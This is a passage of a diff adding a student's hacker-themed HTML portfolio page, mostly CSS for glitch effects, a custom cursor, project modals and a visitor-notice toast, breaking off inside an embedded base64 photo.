@@ -1,0 +1,1245 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Youssef Aitiddouch | Portfolio</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&display=swap');
+
+:root{
+  --green:#00ff41;
+  --red:#ff4141;
+  --amber:#ffaa00;
+  --dim:rgba(0,255,65,0.12);
+  --mid:rgba(0,255,65,0.4);
+}
+
+*{margin:0;padding:0;box-sizing:border-box;cursor:none;}
+
+body{
+  background:#000;
+  color:var(--green);
+  font-family:'Share Tech Mono',monospace;
+  min-height:100vh;
+  overflow-x:hidden;
+}
+
+/* CUSTOM CURSOR */
+.cursor{
+  position:fixed;
+  width:16px;height:16px;
+  border:1px solid var(--green);
+  pointer-events:none;
+  z-index:9999;
+  transform:translate(-50%,-50%);
+  transition:width 0.15s,height 0.15s,opacity 0.15s;
+}
+.cursor-dot{
+  position:fixed;
+  width:4px;height:4px;
+  background:var(--green);
+  border-radius:50%;
+  pointer-events:none;
+  z-index:9999;
+  transform:translate(-50%,-50%);
+}
+.cursor.expanded{width:40px;height:40px;opacity:0.5;}
+
+/* SCANLINE */
+.scanline{
+  position:fixed;top:0;left:0;right:0;bottom:0;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,0.012) 2px,rgba(0,255,65,0.012) 4px);
+  pointer-events:none;
+  z-index:998;
+}
+
+/* MOVING SCAN BAR */
+.scanbar{
+  position:fixed;
+  top:-5%;left:0;right:0;
+  height:5%;
+  background:linear-gradient(180deg,transparent,rgba(0,255,65,0.03),transparent);
+  pointer-events:none;
+  z-index:997;
+  animation:scanbar 6s linear infinite;
+}
+@keyframes scanbar{0%{top:-5%;}100%{top:105%;}}
+
+canvas#rain{
+  position:fixed;top:0;left:0;
+  opacity:0.15;
+  pointer-events:none;
+  z-index:0;
+}
+
+.container{
+  max-width:960px;
+  margin:0 auto;
+  padding:2rem 1.5rem 5rem;
+  position:relative;
+  z-index:1;
+}
+
+/* GLITCH TITLE */
+.glitch{
+  position:relative;
+  font-family:'Rajdhani',sans-serif;
+  font-size:clamp(2.2rem,7vw,5rem);
+  font-weight:700;
+  color:var(--green);
+  letter-spacing:0.04em;
+  animation:flicker 9s infinite;
+}
+.glitch::before,.glitch::after{
+  content:attr(data-text);
+  position:absolute;
+  top:0;left:0;
+  width:100%;
+  font-family:'Rajdhani',sans-serif;
+  font-size:inherit;
+  font-weight:700;
+  letter-spacing:inherit;
+}
+.glitch::before{
+  color:#ff004f;
+  animation:glitch1 3s infinite;
+  clip-path:polygon(0 30%,100% 30%,100% 50%,0 50%);
+}
+.glitch::after{
+  color:#00eeff;
+  animation:glitch2 3s infinite;
+  clip-path:polygon(0 55%,100% 55%,100% 70%,0 70%);
+}
+@keyframes glitch1{
+  0%,90%,100%{transform:translate(0);}
+  92%{transform:translate(-3px,1px);}
+  94%{transform:translate(3px,-1px);}
+  96%{transform:translate(-2px,2px);}
+}
+@keyframes glitch2{
+  0%,88%,100%{transform:translate(0);}
+  90%{transform:translate(3px,-2px);}
+  93%{transform:translate(-3px,1px);}
+  96%{transform:translate(2px,-1px);}
+}
+@keyframes flicker{
+  0%,94%,100%{opacity:1;}
+  95%{opacity:0.3;}
+  96%{opacity:1;}
+  97%{opacity:0.1;}
+  98%{opacity:1;}
+}
+
+/* HEADER */
+.header{
+  border:1px solid var(--green);
+  padding:2.5rem 2rem;
+  margin-bottom:2rem;
+  position:relative;
+  overflow:hidden;
+}
+.header-top-label{
+  font-size:10px;
+  color:var(--mid);
+  letter-spacing:0.2em;
+  margin-bottom:0.75rem;
+}
+.header::after{
+  content:'';
+  position:absolute;
+  top:0;left:0;right:0;height:2px;
+  background:linear-gradient(90deg,transparent,var(--green),transparent);
+  animation:scan 3s linear infinite;
+}
+@keyframes scan{0%{transform:translateX(-100%);}100%{transform:translateX(100%);}}
+
+.subtitle{
+  font-size:11px;
+  color:var(--mid);
+  letter-spacing:0.15em;
+  margin-top:0.6rem;
+}
+
+.blink{animation:blink 1.1s step-end infinite;}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:0;}}
+
+/* STATUS */
+.status-bar{display:flex;gap:1.5rem;margin-top:1.5rem;flex-wrap:wrap;}
+.status-item{font-size:10px;color:rgba(0,255,65,0.6);display:flex;align-items:center;gap:0.4rem;}
+.dot{width:6px;height:6px;border-radius:50%;background:var(--green);animation:pulse 2s infinite;}
+@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(0,255,65,0.5);}50%{box-shadow:0 0 0 5px rgba(0,255,65,0);}}
+
+/* SECTION */
+.section{margin-bottom:2.5rem;}
+.sec-label{
+  font-size:10px;
+  color:rgba(0,255,65,0.5);
+  letter-spacing:0.2em;
+  margin-bottom:1rem;
+  display:flex;align-items:center;gap:0.5rem;
+}
+.sec-label::after{content:'';flex:1;height:1px;background:linear-gradient(90deg,rgba(0,255,65,0.2),transparent);}
+
+/* WARNING */
+.warning{
+  border:1px solid var(--red);
+  padding:1rem 1.5rem;
+  background:rgba(255,65,65,0.03);
+  margin-bottom:2rem;
+  position:relative;
+  overflow:hidden;
+}
+.warning::before{
+  content:'';
+  position:absolute;top:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,transparent,var(--red),transparent);
+  animation:scan 4s linear infinite;
+}
+.warning-label{font-size:9px;color:rgba(255,65,65,0.4);letter-spacing:0.2em;margin-bottom:0.4rem;}
+.warning p{font-size:11px;color:rgba(255,65,65,0.55);line-height:1.7;}
+
+/* PROJECTS */
+.projects{display:grid;grid-template-columns:repeat(auto-fit,minmax(380px,1fr));gap:1px;background:rgba(0,255,65,0.08);}
+
+.pcard{
+  background:#000;
+  padding:1.5rem;
+  position:relative;
+  overflow:hidden;
+  transition:background 0.3s;
+}
+.pcard:hover{background:rgba(0,255,65,0.04);}
+
+.pcard .top-bar{
+  position:absolute;
+  top:0;left:-100%;width:60%;height:1px;
+  background:var(--green);
+  transition:left 0.6s ease;
+}
+.pcard:hover .top-bar{left:100%;}
+
+.pcard-id{font-size:9px;color:rgba(0,255,65,0.3);letter-spacing:0.18em;margin-bottom:0.4rem;}
+.pcard-title{
+  font-family:'Rajdhani',sans-serif;
+  font-size:1.25rem;font-weight:600;
+  color:var(--green);
+  margin-bottom:0.5rem;
+  transition:text-shadow 0.3s;
+}
+.pcard:hover .pcard-title{text-shadow:0 0 12px rgba(0,255,65,0.6);}
+.pcard-desc{font-size:11px;color:rgba(0,255,65,0.5);line-height:1.75;margin-bottom:1rem;}
+
+.tags{display:flex;gap:0.4rem;flex-wrap:wrap;}
+.tag{font-size:9px;letter-spacing:0.08em;color:var(--green);border:1px solid rgba(0,255,65,0.2);padding:2px 7px;}
+.tag.r{color:var(--red);border-color:rgba(255,65,65,0.25);}
+.tag.a{color:var(--amber);border-color:rgba(255,170,0,0.25);}
+
+.featured{grid-column:1/-1;}
+
+/* CORNER BRACKETS */
+.br-tl,.br-tr,.br-bl,.br-br{position:absolute;width:10px;height:10px;}
+.br-tl{top:0;left:0;border-top:1px solid var(--green);border-left:1px solid var(--green);}
+.br-tr{top:0;right:0;border-top:1px solid var(--green);border-right:1px solid var(--green);}
+.br-bl{bottom:0;left:0;border-bottom:1px solid var(--green);border-left:1px solid var(--green);}
+.br-br{bottom:0;right:0;border-bottom:1px solid var(--green);border-right:1px solid var(--green);}
+
+/* SKILLS */
+.skills-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:1px;background:rgba(0,255,65,0.08);}
+.cat-label{font-size:9px;color:rgba(0,255,65,0.35);letter-spacing:0.15em;padding:0.6rem 0 0.2rem;grid-column:1/-1;}
+.skill{background:#000;padding:0.9rem 1rem;transition:background 0.2s;}
+.skill:hover{background:rgba(0,255,65,0.05);}
+.skill-name{font-size:11px;color:var(--green);}
+.skill-sub{font-size:9px;color:rgba(0,255,65,0.35);margin-top:1px;}
+.skill-bar{height:1px;background:rgba(0,255,65,0.1);margin-top:0.6rem;position:relative;}
+.skill-fill{
+  position:absolute;top:0;left:0;height:1px;
+  background:var(--green);
+  width:0;
+  transition:width 1.8s cubic-bezier(0.4,0,0.2,1);
+  box-shadow:0 0 6px rgba(0,255,65,0.8);
+}
+
+/* TYPED TERMINAL */
+.terminal{
+  border:1px solid rgba(0,255,65,0.25);
+  padding:1.25rem 1.5rem;
+  background:rgba(0,255,65,0.02);
+  font-size:11px;
+  line-height:2;
+  color:rgba(0,255,65,0.6);
+}
+.terminal .prompt{color:var(--green);}
+.terminal .val{color:#fff;}
+
+/* CONTACT */
+.cline{font-size:11px;color:rgba(0,255,65,0.5);margin-bottom:0.4rem;display:flex;gap:1rem;}
+.cline span{color:var(--green);}
+
+/* FOOTER */
+.footer{font-size:9px;color:rgba(0,255,65,0.15);letter-spacing:0.1em;margin-top:3rem;}
+
+/* HOVER RIPPLE on cards */
+.pcard{isolation:isolate;}
+.ripple{
+  position:absolute;
+  border-radius:50%;
+  border:1px solid rgba(0,255,65,0.4);
+  width:10px;height:10px;
+  transform:translate(-50%,-50%) scale(0);
+  animation:ripple 0.6s linear forwards;
+  pointer-events:none;
+}
+@keyframes ripple{
+  to{transform:translate(-50%,-50%) scale(20);opacity:0;}
+}
+
+/* GLASSES CURSOR */
+#glasses-cursor{position:fixed;pointer-events:none;z-index:9999;transform:translate(-50%,-58%);width:72px;height:46px;}
+
+/* VISITOR TOAST */
+#visitor-toast{position:fixed;bottom:1.5rem;right:1.5rem;border:1px solid rgba(255,65,65,0.35);background:rgba(0,0,0,0.95);padding:0.75rem 1rem;z-index:500;width:230px;transform:translateX(270px);transition:transform 0.5s cubic-bezier(0.22,1,0.36,1);}
+#visitor-toast.visible{transform:translateX(0);}
+.vt-label{font-size:8px;color:rgba(255,65,65,0.4);letter-spacing:0.2em;margin-bottom:0.3rem;}
+.vt-msg{font-size:10px;color:rgba(255,65,65,0.7);line-height:1.6;}
+.vt-sub{font-size:8px;color:rgba(255,65,65,0.3);margin-top:0.3rem;}
+
+/* HERO ROW */
+.hero-row{display:flex;align-items:center;gap:2rem;flex-wrap:wrap;margin-bottom:0.5rem;}
+.hero-photo-wrap{position:relative;flex-shrink:0;width:240px;}
+.hero-photo-wrap img{width:240px;display:block;object-fit:cover;filter:grayscale(35%) contrast(1.15) brightness(0.88);border:1px solid rgba(0,255,65,0.35);}
+#photo-rain{position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;mix-blend-mode:screen;opacity:0.55;z-index:2;}
+.photo-scanlines{position:absolute;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,0,0,0.18) 3px,rgba(0,0,0,0.18) 4px);pointer-events:none;z-index:3;}
+.photo-label{position:absolute;bottom:0;left:0;right:0;background:rgba(0,0,0,0.82);border-top:1px solid rgba(0,255,65,0.2);font-size:8px;color:rgba(0,255,65,0.5);letter-spacing:0.15em;padding:4px 8px;z-index:4;}
+.hero-name{flex:1;min-width:180px;}
+.hero-tags{display:flex;gap:0.4rem;flex-wrap:wrap;margin-top:0.75rem;}
+.htag{font-size:9px;letter-spacing:0.12em;padding:3px 8px;border:1px solid rgba(0,255,65,0.2);color:rgba(0,255,65,0.5);}
+.htag.r{color:var(--red);border-color:rgba(255,65,65,0.25);}
+.htag.a{color:var(--amber);border-color:rgba(255,170,0,0.25);}
+
+/* CLICK HINT */
+.click-hint{font-size:9px;color:rgba(0,255,65,0.25);letter-spacing:0.15em;margin-bottom:0.75rem;}
+
+/* MODAL */
+.modal-backdrop{position:fixed;inset:0;background:rgba(0,0,0,0.93);z-index:2000;display:flex;align-items:flex-start;justify-content:center;opacity:0;pointer-events:none;transition:opacity 0.3s;overflow-y:auto;padding:2rem 1rem 4rem;}
+.modal-backdrop.open{opacity:1;pointer-events:all;}
+.modal{width:100%;max-width:860px;border:1px solid rgba(0,255,65,0.35);background:#000;transform:translateY(30px);transition:transform 0.35s cubic-bezier(0.22,1,0.36,1);}
+.modal-backdrop.open .modal{transform:translateY(0);}
+.modal-topbar{display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid rgba(0,255,65,0.15);padding:0.75rem 1.5rem;font-size:9px;color:rgba(0,255,65,0.35);letter-spacing:0.18em;}
+.modal-close{background:none;border:1px solid rgba(0,255,65,0.25);color:var(--green);font-family:'Share Tech Mono',monospace;font-size:10px;padding:3px 10px;cursor:pointer;letter-spacing:0.1em;}
+.modal-close:hover{background:rgba(0,255,65,0.08);}
+.modal-body{padding:2rem 1.5rem;}
+.modal-hero{border:1px solid rgba(0,255,65,0.15);padding:1.5rem;margin-bottom:2rem;position:relative;background:rgba(0,255,65,0.02);}
+.modal-hero::before{content:'';position:absolute;top:0;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,var(--green),transparent);animation:scan 4s linear infinite;}
+.modal-project-id{font-size:9px;color:rgba(0,255,65,0.3);letter-spacing:0.2em;margin-bottom:0.5rem;}
+.modal-title{font-family:'Rajdhani',sans-serif;font-size:2rem;font-weight:700;color:var(--green);margin-bottom:0.75rem;text-shadow:0 0 20px rgba(0,255,65,0.3);}
+.modal-tagline{font-size:12px;color:rgba(0,255,65,0.6);line-height:1.8;margin-bottom:1rem;}
+.modal-tags{display:flex;gap:0.4rem;flex-wrap:wrap;}
+.modal-section{margin-bottom:2rem;}
+.modal-sec-label{font-size:9px;color:rgba(0,255,65,0.4);letter-spacing:0.2em;margin-bottom:0.8rem;padding-bottom:0.4rem;border-bottom:1px solid rgba(0,255,65,0.1);display:flex;align-items:center;gap:0.5rem;}
+.modal-sec-label::before{content:'//';color:rgba(0,255,65,0.2);}
+.modal-text{font-size:11px;color:rgba(0,255,65,0.55);line-height:1.85;margin-bottom:0.75rem;}
+.tier-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:1px;background:rgba(0,255,65,0.08);margin-top:0.5rem;}
+.tier-card{background:#000;padding:1rem;}
+.tier-label{font-size:9px;letter-spacing:0.15em;margin-bottom:0.3rem;}
+.tier-label.green{color:rgba(0,255,65,0.5);}
+.tier-label.amber{color:var(--amber);}
+.tier-label.red{color:var(--red);}
+.tier-name{font-family:'Rajdhani',sans-serif;font-size:1rem;font-weight:600;color:var(--green);margin-bottom:0.5rem;}
+.tier-feature{font-size:10px;color:rgba(0,255,65,0.45);line-height:1.8;padding-left:0.5rem;}
+.tier-feature::before{content:'> ';}
+.tier-feature.locked{color:rgba(255,65,65,0.4);}
+.tier-feature.locked::before{content:'x ';}
+.tier-data-req{margin-top:0.75rem;font-size:9px;padding:3px 8px;display:inline-block;}
+.tier-data-req.safe{color:rgba(0,255,65,0.5);border:1px solid rgba(0,255,65,0.2);}
+.tier-data-req.warn{color:var(--amber);border:1px solid rgba(255,170,0,0.3);}
+.tier-data-req.danger{color:var(--red);border:1px solid rgba(255,65,65,0.3);}
+.stack-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:1px;background:rgba(0,255,65,0.08);}
+.stack-item{background:#000;padding:0.8rem 1rem;}
+.stack-tech{font-size:11px;color:var(--green);margin-bottom:2px;}
+.stack-role{font-size:9px;color:rgba(0,255,65,0.35);}
+.timeline{position:relative;padding-left:1.5rem;}
+.timeline::before{content:'';position:absolute;left:0;top:0;bottom:0;width:1px;background:rgba(0,255,65,0.15);}
+.tl-item{position:relative;margin-bottom:1.25rem;}
+.tl-item::before{content:'';position:absolute;left:-1.5rem;top:4px;width:6px;height:6px;border:1px solid var(--green);background:#000;}
+.tl-sprint{font-size:9px;color:rgba(0,255,65,0.3);letter-spacing:0.15em;margin-bottom:2px;}
+.tl-desc{font-size:11px;color:rgba(0,255,65,0.55);line-height:1.75;}
+.dark-pattern-box{border:1px solid rgba(255,65,65,0.3);padding:1rem 1.25rem;background:rgba(255,65,65,0.02);position:relative;margin-bottom:1rem;}
+.dark-pattern-box::before{content:'! DARK PATTERN GEDETECTEERD';position:absolute;top:-8px;left:10px;font-size:8px;color:var(--red);letter-spacing:0.2em;background:#000;padding:0 6px;}
+.dark-pattern-box p{font-size:11px;color:rgba(255,65,65,0.5);line-height:1.75;}
+#creepy-ad{display:none;border:1px solid rgba(255,170,0,0.5);background:rgba(255,170,0,0.03);padding:1.25rem;}
+.ad-label{font-size:7px;color:rgba(255,170,0,0.3);letter-spacing:0.2em;margin-bottom:0.5rem;}
+#ad-headline{font-family:'Rajdhani',sans-serif;font-size:1.1rem;font-weight:700;color:var(--amber);margin-bottom:0.4rem;}
+#ad-body{font-size:10px;color:rgba(255,170,0,0.6);line-height:1.75;margin-bottom:0.75rem;}
+.ad-footer{display:flex;justify-content:space-between;align-items:center;}
+#ad-cta{background:rgba(255,170,0,0.15);border:1px solid rgba(255,170,0,0.4);color:var(--amber);font-family:'Share Tech Mono',monospace;font-size:9px;padding:5px 14px;cursor:pointer;}
+.ad-no-close{font-size:8px;color:rgba(255,65,65,0.25);}
+@media(max-width:600px){.modal-title{font-size:1.4rem;}.hero-row{flex-direction:column;}}
+</style>
+</head>
+<body>
+
+<!-- GLASSES CURSOR -->
+<div id="glasses-cursor">
+  <svg viewBox="0 0 100 44" xmlns="http://www.w3.org/2000/svg" style="width:100%;height:100%;overflow:visible;">
+    <line x1="0" y1="15" x2="9" y2="20" stroke="#00ff41" stroke-width="2.5" stroke-linecap="round"/>
+    <line x1="100" y1="15" x2="91" y2="20" stroke="#00ff41" stroke-width="2.5" stroke-linecap="round"/>
+    <path d="M46 22 Q50 13 54 22" fill="none" stroke="#00ff41" stroke-width="2.5"/>
+    <rect x="9" y="11" width="35" height="22" rx="5" fill="rgba(0,8,4,0.9)" stroke="#00ff41" stroke-width="1.8"/>
+    <rect x="56" y="11" width="35" height="22" rx="5" fill="rgba(0,8,4,0.9)" stroke="#00ff41" stroke-width="1.8"/>
+    <foreignObject x="10" y="12" width="33" height="20">
+      <canvas xmlns="http://www.w3.org/1999/xhtml" id="cur-left" width="33" height="20" style="display:block;border-radius:4px;"></canvas>
+    </foreignObject>
+    <foreignObject x="57" y="12" width="33" height="20">
+      <canvas xmlns="http://www.w3.org/1999/xhtml" id="cur-right" width="33" height="20" style="display:block;border-radius:4px;"></canvas>
+    </foreignObject>
+  </svg>
+</div>
+
+<div class="scanline"></div>
+<div class="scanbar"></div>
+<canvas id="rain"></canvas>
+
+<div id="visitor-toast">
+  <div class="vt-label">// LIVE_MONITOR</div>
+  <div class="vt-msg" id="vt-msg">iemand bekijkt dit portfolio.</div>
+  <div class="vt-sub" id="vt-sub">locatie: onbekend</div>
+</div>
+
+<div class="container">
+
+  <header class="header">
+    <div class="header-top-label">// PORTFOLIO_v3.0 &gt; STUDENT_RECORD &gt; HBO_ICT &gt; CYBER_SECURITY</div>
+    <div class="hero-row">
+      <div class="hero-name">
+        <h1 class="glitch" data-text="YOUSSEF AITIDDOUCH">YOUSSEF AITIDDOUCH<span class="blink">_</span></h1>
+        <p class="subtitle">CYBER SECURITY &nbsp;&#183;&nbsp; HVA &nbsp;&#183;&nbsp; YEAR 2</p>
+        <div class="hero-tags">
+          <span class="htag">CYBER SECURITY</span>
+          <span class="htag r">DARK TECH</span>
+          <span class="htag a">AMSTERDAM</span>
+          <span class="htag">FORENSISCH ICT</span>
+        </div>
+      </div>
+      <div class="hero-photo-wrap">
+        <img src="data:image/jpeg;base64,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